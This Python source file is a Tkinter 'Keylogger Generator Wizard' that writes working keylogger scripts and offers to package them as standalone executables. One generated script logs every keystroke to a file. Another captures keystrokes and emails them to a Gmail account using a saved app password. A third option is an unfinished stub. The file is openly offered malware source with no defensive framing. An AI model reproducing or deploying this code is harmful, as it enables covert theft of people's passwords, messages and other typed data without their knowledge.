import tkinter as tk
from tkinter import messagebox
import subprocess
import yaml

def save_input_email_keylogger():
    global entry_1, entry_2
    
    user_input_1 = entry_1.get()
    user_input_2 = entry_2.get()
    
    question_email_1 = messagebox.askyesno("Verify", f"Verify the information:\nEmail: {user_input_1}\nApp-Password: {user_input_2}")

    if question_email_1:
        global saved_input_1, saved_input_2
        saved_input_1 = user_input_1
        saved_input_2 = user_input_2

        messagebox.showinfo("Creating Email", "The program is generating a keylogger for you :)")

        # Save credentials to yaml file
        credentials = {
            'email': saved_input_1,
            'password': saved_input_2
        }
        with open('credentials.yaml', 'w') as file:
            yaml.dump(credentials, file)

        with open('email-keylogger.py', 'w') as eKeylog:
            eKeylog.write(f"""
import smtplib
import time
import yaml
from pynput.keyboard import Listener

with open('credentials.yaml', 'r') as file:
    credentials = yaml.safe_load(file)

email = credentials['email']
password = credentials['password']

log = ""

def send_log():
    global log
    if log:
        try:
            server = smtplib.SMTP('smtp.gmail.com', 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, log)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {{e}}")
        log = ""

def on_press(key):
    global log
    log += str(key)
    if len(log) > 100:  # Send email if log length exceeds 100 characters
        send_log()

with Listener(on_press=on_press) as listener:
    while True:
        time.sleep(60)
        send_log()
        listener.join()
""")

    else:
        pass

def on_button_click_email_keylogger():
    global entry_1, entry_2

    tk.Label(root, text="Custom options for email Keylogger").pack(pady=10, padx=10)
    disable_other_buttons("email")

    tk.Label(root, text="Type your gmail address").pack(pady=10)
    entry_1 = tk.Entry(root)
    entry_1.pack(pady=5)

    tk.Label(root, text="Enter your app-password").pack(pady=10)
    entry_2 = tk.Entry(root)
    entry_2.pack(pady=5)

    save_button_email_keylogger = tk.Button(root, text="Next", command=save_input_email_keylogger)
    save_button_email_keylogger.pack(pady=25)

    enable_buttons("end")

def on_button_click_encrypted_connection():
    tk.Label(root, text="Custom options for encrypted connection keylogger").pack(pady=10, padx=10) 
    disable_other_buttons("encrypted")
    enable_buttons("end")

def on_button_click_simple_keylogger():
    tk.Label(root, text="Custom options for simple Keylogger").pack(pady=10, padx=10)
    disable_other_buttons("simple")

    with open('simple-keylogger.py', 'w') as SKeylog:
        SKeylog.write("""from pynput.keyboard import Listener

def writetofile(key):
    keydata = str(key)
    with open('keylogfile.txt', 'a') as keylog:
        keylog.write(keydata)

with Listener(on_press=writetofile) as l:
    l.join()
""")

    convert_to_exe('simple-keylogger.py')
    enable_buttons("end")

def convert_to_exe(script_name):
    response = messagebox.askyesno("Convert to EXE", f"Do you want to convert {script_name} to an executable (EXE) file?")
    
    if response:
        tk.Label(root, text="The script will be converted to an EXE file.").pack(pady=10, padx=10)
        subprocess.run(['python', '-m', 'PyInstaller', '--onefile', script_name])
        tk.Label(root, text="Your script has been converted to an exe file").pack(pady=10, padx=10)
    
    else:
        tk.Label(root, text="The script will not be converted to an EXE file.").pack(pady=10, padx=10)

def disable_other_buttons(selected_button):
    if selected_button != "simple":
        keylogger_button_1.config(state="disabled")
    if selected_button != "email":
        keylogger_button_2.config(state="disabled")
    if selected_button != "encrypted":
        keylogger_button_3.config(state="disabled")

def enable_buttons(selected_button):
    if selected_button == "end":
        keylogger_button_1.config(state="normal")
        keylogger_button_2.config(state="normal")
        keylogger_button_3.config(state="normal")

# Init Tkinter
root = tk.Tk()
root.title("Keylogger Generator Wizard")
root.geometry("620x700")

# --- Keylogger Wizard Widgets --- 
tk.Label(root, text="Keyloggers Generator Wizard").pack(pady=5, padx=5)

# Simple Keylogger Widgets
keylogger_button_1 = tk.Button(root, text="Simple Keylogger", command=on_button_click_simple_keylogger)
keylogger_button_1.pack(pady=20)

# Email Keylogger Widgets
keylogger_button_2 = tk.Button(root, text="Email Keylogger", command=on_button_click_email_keylogger)
keylogger_button_2.pack(pady=30)

# Encrypted Keylogger Widgets 
keylogger_button_3 = tk.Button(root, text="Encrypted Connection Keylogger", command=on_button_click_encrypted_connection)
keylogger_button_3.pack(pady=40)

root.mainloop()
